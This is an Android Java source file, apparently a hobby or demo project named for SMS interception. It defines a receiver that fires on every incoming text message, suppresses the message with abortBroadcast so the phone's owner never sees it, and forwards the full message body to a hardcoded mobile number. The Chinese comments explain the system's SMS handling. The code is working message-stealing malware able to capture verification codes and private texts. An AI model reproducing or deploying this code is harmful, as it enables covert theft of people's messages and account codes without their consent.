package com.example.hjh.smsinterception;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.ArrayList;

/**
 * Created by HJH on 2016/3/16.
 */
public class MySmsInter extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        /*
        android系统中短信接收接口的处理方式：
            1、调用服务进行通知（使用同步锁，强制完成一系列步骤）
                    当通知完后回到当前函数，解锁
                    当被服务被停止后，立刻解锁
            2、具体代码：
    //同步锁
    static final Object mStartingServiceSync = new Object();

    //用于保存同步锁的对象
    static PowerManager.WakeLock mStartingService;

    //创建并启动通知服务
    intent.setClass(context, SmsReceiverService.class);
    intent.putExtra("result", getResultCode());
    beginStartingService(context, intent);

    // 启动服务来进行通知操作，在返回前获取唤醒锁以确保服务将运行
    public static void beginStartingService(Context context, Intent intent) {
        synchronized (mStartingServiceSync) {
            if (mStartingService == null) {
                PowerManager pm =
                    (PowerManager)context.getSystemService(Context.POWER_SERVICE);
                mStartingService = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                        "StartingAlertService");
                mStartingService.setReferenceCounted(false);
            }
            mStartingService.acquire();
            context.startService(intent);
        }
    }

    //当服务完成通知操作后，回调该函数，进行解锁
     public static void finishStartingService(Service service, int startId) {
         synchronized (mStartingServiceSync) {
             if (mStartingService != null) {
                 if (service.stopSelfResult(startId)) {
                        mStartingService.release();
                 }
             }
         }
    }
    */
        Log.i("TAG", "SmsRecevier onReceive");
        //从原始的PDU（protocol description units）创建一个SmsMessage。这个方法很重要，
        // 在我们编写短信接收程序i要用到，它从我们接收到的广播意图中获取的字节创建SmsMessage。
        abortBroadcast();
        Bundle bundle = intent.getExtras();
        Object[] pdus = (Object[]) bundle.get("pdus");//用于获取短信
        if(pdus != null && pdus.length>0) {
            SmsMessage[] messages = new SmsMessage[pdus.length];//创建短信集
            for(int i=0;i<messages.length;i++){
                byte[] pdu=(byte[]) pdus[i];
                messages[i] = SmsMessage.createFromPdu(pdu);//通过pdu获取短信
            }
            String content="";
            for(SmsMessage msg : messages) {
                //获取发送短信的内容，和接收方
                content += msg.getMessageBody().toString();
//                String sender = msg.getOriginatingAddress();
                Log.i("abc",content);
                //获取发送时间
//                Date date = new Date(msg.getTimestampMillis());
//                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
//                String sendTime = sdf.format(date);


            }
            //获取SmsManager短信管理器，发送短信
            SmsManager smsManager = SmsManager.getDefault();
            ArrayList<String> divideContents = smsManager.divideMessage(content);
            smsManager.sendMultipartTextMessage("13726599558", null, divideContents, null, null);
        }

    }
}
